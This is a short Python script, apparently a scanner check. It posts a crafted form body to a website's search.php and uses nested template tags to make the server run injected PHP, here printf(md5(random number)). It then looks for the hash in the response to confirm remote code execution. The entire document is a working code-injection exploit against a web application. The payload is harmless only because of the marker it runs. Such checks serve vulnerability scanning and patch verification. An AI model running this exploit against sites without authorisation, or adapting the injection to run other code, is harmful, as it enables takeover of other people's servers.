import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(2000000000, 2100000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"search.php"
	body="searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=prin&9[]=tf(md5("+str(rand)+"));"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(rand).encode()).hexdigest() in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
